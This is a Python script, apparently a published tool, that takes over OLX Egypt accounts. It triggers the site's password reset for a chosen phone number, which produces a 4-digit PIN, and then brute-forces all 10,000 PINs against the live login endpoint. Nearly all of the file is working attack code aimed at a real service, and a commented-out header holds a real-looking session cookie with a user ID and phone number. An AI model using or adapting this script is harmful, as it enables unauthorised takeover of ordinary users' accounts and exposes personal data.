
import requests
import colorama

BANNER = '''
                                                   
.oPYo. o      o    o    .oPYo.                        o  
8    8 8      `b  d'    8.                            8  
8    8 8       `bd'     `boo   .oPYo. o    o .oPYo.  o8P 
8    8 8       .PY.     .P     8    8 8    8 8    8   8  
8    8 8      .P  Y.    8      8    8 8    8 8    8   8  
`YooP' 8oooo .P    Y.   `YooP' `YooP8 `YooP8 8YooP'   8  
:.....:........::::..::::.....::....8 :....8 8 ....:::..:
:::::::::::::::::::::::::::::::::ooP'.::ooP'.8 ::::::::::
:::::::::::::::::::::::::::::::::...::::...::..::::::::::
                                                                 
 .oPYo.                o          d'b                            
 8   `8                8          8                              
o8YooP' oPYo. o    o  o8P .oPYo. o8P  .oPYo. oPYo. .oPYo. .oPYo. 
 8   `b 8  `' 8    8   8  8oooo8  8   8    8 8  `' 8    ' 8oooo8 
 8    8 8     8    8   8  8.      8   8    8 8     8    . 8.     
 8oooP' 8     `YooP'   8  `Yooo'  8   `YooP' 8     `YooP' `Yooo' 
:......:..:::::.....:::..::.....::..:::.....:..:::::.....::.....:
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

[+] OLX Brute Force tool using Reset Password Feature to regenerate user's account password,
	which consists of only 4 digits.
 
[-] Author: Deyaa Muhammad
[-] Twitter: @deyaamuhammad

'''


class Exploit:

	def __init__(self, *args, **kwargs):

		self.phone = None
		self.pin = None
		self.iter = None
		self.resetSuccess = False
		self.loginSuccess = False


		self.run()

	def run(self):

		print(BANNER)

		self.catchPhone()
		
		if self.resetSuccess:
			self.bruteForce(self.phone)

	def catchPhone(self):

		self.phone = input("\nPlease Set Phone Number: ")

		reset = ResetPassword(self.phone)

		if reset.success:
			print("New Password has been generated.")
			self.resetSuccess = True

		else:
			print("Phone not found.")
			self.resetSuccess = False

			

	def bruteForce(self, phone):

		for i in range(10000):

			self.iter = str(i)
			self.pin = self.iter.zfill(4)

			login = OTPLogin(phone, self.pin)

			if login.success:
				print(f"Password has been found {self.pin}.")
				self.loginSuccess = True
				break

			else:
				print(f"Wrong Password {self.pin}.")
				self.loginSuccess = False

		print(f"Failed to find password.")
		self.loginSuccess = False




	

class ResetPassword:


	def __init__(self, phone, session=None, *args, **kwargs):

		self.phone = phone
		self.success = False
		self.session = session

		self.Reset(phone)
		

	def Reset(self, phone):

		try:

			url = 'https://www.olx.com.eg/account/password/'

			headers = {
				"Host": "www.olx.com.eg",
				# "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:74.0) Gecko/20100101 Firefox/74.0",
				"User-Agent": "Mozilla/0.0 (Windows NT 0.0; rv:00.0) Gecko/00100101 Firefox/00.0",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate, br",
				"Referer": "https://www.olx.com.eg/account/password/",
				"Content-Type": "application/x-www-form-urlencoded",
				# "Content-Length": "53",
				"Origin": "https://www.olx.com.eg",
				"Connection": "keep-alive",
				# "Cookie": "PHPSESSID_EG=ct04riqvbnbj44lb5huuh2saj3; mobile_default=desktop; onap=1710c5db8a2x349a1737-1-1710c5db8a2x349a1737-13-1585052575; ldTd=true; _gcl_au=1.1.1531201024.1585050403; _rtb_user_id=dd29ec08-e968-6cb8-f38f-b6083468e018; __utma=1.2098159248.1585050403.1585050403.1585050403.1; __utmb=1.0.10.1585050403; __utmc=1; __utmz=1.1585050403.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __gfp_64b=ZrXQxBVUeFmifADNsYzUP5pSu_ckFZLkIXZyknyBcKb.u7; _fbp=fb.2.1585050404529.2133547634; _gu=efae478d-bdb5-418e-8514-1abeede89b3d; _gw=2.u%5B%2C%2C%2C%2C%5Dv%5B~fq7vs%2C~7%2C~0%5Da(); _gs=2.s(src%3Dhttps%3A%2F%2Fwww.olx.com.eg%2Faccount%2F%3Fphone%3D01119569576)c%5BDesktop%2CFirefox%2C28%3A270%3A2996%3A%2CWindows%2C156.204.117.184%5D; _ga=GA1.3.2098159248.1585050403; _gid=GA1.3.1488230406.1585050406; user_id=108048903; __gads=ID=0f5e65fe4b3896ce:T=1585050473:S=ALNI_MZ0I_7Ijp9yKGOIBg6IwfqZ6WYfhw; _gat_UA-52442898-2=1",
				"Upgrade-Insecure-Requests": "1",
				"TE": "Trailers",
			}

			payload = f'register%5Bphone%5D={phone}&register%5Brules%5D=1'

			if self.session is None:
				self.session = requests.Session()

			r = self.session.post(url, data=payload, headers=headers)


			if 'errorbox' in r.text:
				self.success = False
				return False
			else:
				self.success = True
				return True

		except:

			self.success = False
			return False	


class OTPLogin:

	def __init__(self, phone, pin, session=None, *args, **kwargs):

		self.phone = phone
		self.pin = pin
		self.success = False
		self.session = session

		self.Login(phone, pin)
		

	def Login(self, phone, pin):

		try:

			url = f'https://www.olx.com.eg/account/?phone={phone}'

			headers = {
				"Host": "www.olx.com.eg",
				"User-Agent": "Mozilla/7.0 (Windows NT 15.0; rv:70.0) Gecko/00100101 Firefox/70.0",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate, br",
				"Referer": f"https://www.olx.com.eg/account/?phone={phone}",
				"Content-Type": "application/x-www-form-urlencoded",
				"Origin": "https://www.olx.com.eg",
				"Connection": "keep-alive",
				"Upgrade-Insecure-Requests": "1",
				"TE": "Trailers",
			}

			payload = f'login%5Bphone%5D={phone}&login%5Bpassword%5D={pin}'


			if self.session is None:
				self.session = requests.Session()

			r = self.session.post(url, data=payload, headers=headers)
			

			# print(r.text)

			if 'noscriptErrors' in r.text:
				self.success = False
				return False
			else:
				self.success = True
				return True

		except:

			self.success = False
			return False	



if __name__=='__main__':
	Exploit()